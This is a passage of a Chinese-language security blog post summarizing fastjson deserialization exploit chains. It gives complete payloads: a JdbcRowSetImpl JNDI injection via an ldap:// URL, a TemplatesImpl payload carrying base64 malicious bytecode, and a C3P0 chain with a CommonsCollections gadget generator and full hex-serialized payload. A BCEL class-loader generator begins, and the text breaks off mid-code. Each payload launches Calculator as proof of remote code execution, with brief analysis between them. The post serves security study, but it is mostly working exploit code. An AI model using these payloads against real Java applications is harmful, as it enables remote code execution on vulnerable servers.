<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>fastjson利用链总结与SnakeYAML不出网利用链的探寻 | N11's Blog</title><meta name="author" content="N11"><meta name="copyright" content="N11"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Fastjson利用链JdbcRowSetImplpayload12String text &#x3D; &quot;&amp;#123;\&quot;1\&quot;:&amp;#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&amp;#125;,">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson利用链总结与SnakeYAML不出网利用链的探寻">
<meta property="og:url" content="https://n11-study.github.io/2025/05/26/fastjson%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93%E4%B8%8ESnakeYAML%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%8E%A2%E5%AF%BB/index.html">
<meta property="og:site_name" content="N11&#39;s Blog">
<meta property="og:description" content="Fastjson利用链JdbcRowSetImplpayload12String text &#x3D; &quot;&amp;#123;\&quot;1\&quot;:&amp;#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&amp;#125;,">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032888.jpg">
<meta property="article:published_time" content="2025-05-26T10:26:42.000Z">
<meta property="article:modified_time" content="2025-05-26T10:26:54.728Z">
<meta property="article:author" content="N11">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032888.jpg"><link rel="shortcut icon" href="https://gitee.com/Me0cr1D/img_bedroom/raw/master/images/202410210921333.x-icon"><link rel="canonical" href="https://n11-study.github.io/2025/05/26/fastjson%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93%E4%B8%8ESnakeYAML%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%8E%A2%E5%AF%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        if (name && globalFn[key][name]) return
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'fastjson利用链总结与SnakeYAML不出网利用链的探寻',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-26 18:26:54'
}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg" style="background-image: url(https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032773.png);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032773.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">N11's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">fastjson利用链总结与SnakeYAML不出网利用链的探寻</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">fastjson利用链总结与SnakeYAML不出网利用链的探寻</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-26T10:26:42.000Z" title="发表于 2025-05-26 18:26:42">2025-05-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-26T10:26:54.728Z" title="更新于 2025-05-26 18:26:54">2025-05-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Fastjson利用链"><a href="#Fastjson利用链" class="headerlink" title="Fastjson利用链"></a>Fastjson利用链</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String text = <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="Payload的剖析"><a href="#Payload的剖析" class="headerlink" title="Payload的剖析"></a>Payload的剖析</h4><p><strong>因为JdbcRowSetImpl存在JNDI注入，可以利用JNDIMap配合注入</strong></p>
<p><strong>JdbcRowSetImpl内存在无参构造方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(text);</span><br></pre></td></tr></table></figure>

<p>会触发所有setter和getter方法，留意setAutoCommit</p>
<p>![截屏2025-05-26 15.53.06](/Users/mac/Library/Application Support/typora-user-images/截屏2025-05-26 15.53.06.png)</p>
<p>当构造方法参数conn为null会调用connect方法</p>
<p>在实例化过程中，会调用无参构造方法，conn默认为nul</p>
<p>当getDataSourceName方法返回结果不为null，会尝试发起一次JNDI请求![截屏2025-05-26 15.53.34](/Users/mac/Library/Application Support/typora-user-images/截屏2025-05-26 15.53.34.png)</p>
<p>从setter得知，我们需要一个布尔值给autoCommit,便可以在代码执行时触发到setAutoCommit</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>利用TemplatesImpl#getOutputPropertie去加载字节码rce</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1ieXRlX2V4cC5qYXZhDAAHAAgHABwMAB0AHgEAPS9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IMAB8AIAEAFG9yZy9leGFtcGxlL2J5dGVfZXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABQACwAAAAQAAQAPAAEAEQAAAAIAEg==\&quot;],&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#x27;_name&#x27;:&#x27;N11&#x27;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(text, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p>Java对象的字段如果是private或protected，默认情况下Fastjson可能无法直接访问这些字段进行反序列化，除非通过setter方法或者特定的Feature开启</p>
<p>该链子的弊端在于需要引入Feature.SupportNonPublicField依赖，在大多数情况是不存在的</p>
<p>该链子的弊端在于需要引入Feature.SupportNonPublicField依赖，在大多数情况是不存在的</p>
<h3 id="com-mchange-v2-c3p0-WrapperConnectionPoolDataSource："><a href="#com-mchange-v2-c3p0-WrapperConnectionPoolDataSource：" class="headerlink" title="com.mchange.v2.c3p0.WrapperConnectionPoolDataSource："></a><strong>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</strong>：</h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p>具体分析可以看一下c3p0链</p>
<p>生成hex码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.java_study.C3P0_1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">getPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;N11&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;FJ的hexEXP填这个：&quot;</span>+bytesToHexString(baos.toByteArray())+ <span class="string">&quot;z&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span> + bytesToHexString(baos.toByteArray()) + <span class="string">&quot;z&quot;</span>;</span><br><span class="line">        <span class="type">WrapperConnectionPoolDataSource</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WrapperConnectionPoolDataSource</span>();</span><br><span class="line">        exp.setUserOverridesAsString(ser);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bArray.length;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Payload;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123; \&quot;a\&quot;: &#123; \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot; &#125;, \&quot;b\&quot;: &#123; \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;, \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740004746573747372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65707400096765744D6574686F64757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001C7371007E00137571007E00180000000271007E001270740006696E766F6B657571007E001C00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E00137571007E00180000000174003D2F53797374656D2F4170706C69636174696F6E732F43616C63756C61746F722E6170702F436F6E74656E74732F4D61634F532F43616C63756C61746F72740004657865637571007E001C0000000171007E001F7371007E00003F4000000000000C7708000000100000000078787400034E313178z\&quot; &#125; &#125;&quot;</span>;</span><br><span class="line">            </span><br></pre></td></tr></table></figure>





<h3 id="sun-rmi-server-MarshalOutputStream"><a href="#sun-rmi-server-MarshalOutputStream" class="headerlink" title="sun.rmi.server.MarshalOutputStream"></a>sun.rmi.server.MarshalOutputStream</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>openjdk &gt;= 11 </p>
<p>因为只有这些版本没去掉符号信息. fastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用</p>
<p>的, 所以可以多利用一些内部类</p>
<p>在fastjson中利用比较鸡肋</p>
<h3 id="com-sun-org-apache-bcel-internal-util-ClassLoader"><a href="#com-sun-org-apache-bcel-internal-util-ClassLoader" class="headerlink" title="com.sun.org.apache.bcel.internal.util.ClassLoader"></a>com.sun.org.apache.bcel.internal.util.ClassLoader</h3><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p>恶意BECL码生成：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.java_study.byteloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = fileToBinArray(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/mac/check_code/java/chains/src/main/java/org/java_study/byteloader/Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes, <span class="literal">true</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">        classLoader.loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 